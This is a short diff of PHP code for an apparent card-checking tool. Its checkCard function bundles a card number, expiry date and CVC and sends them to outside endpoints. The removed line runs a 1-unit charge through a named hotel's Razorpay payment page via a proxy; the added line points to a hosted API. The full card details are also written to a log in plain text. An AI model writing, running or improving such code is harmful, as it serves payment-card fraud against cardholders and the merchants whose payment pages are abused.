@@ -16,7 +16,7 @@ function log_message($message) {
 function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
     $card_details = "$card_number|$exp_month|$exp_year|$cvc";
     $encoded_cc = urlencode($card_details);
-    $api_url = "http://168.220.237.46:5000/key=rz/proxy=proxy%20laga%20le/site=https://razorpay.me/@hotelparasinternationaldelhi/price=1/cc=$encoded_cc";
+    $api_url = "https://rockyrockss.onrender.com/api/razorpay/pay?cc=$encoded_cc";
     log_message("Checking card: $card_details, URL: $api_url");
 
     for ($attempt = 0; $attempt <= $retry; $attempt++) {
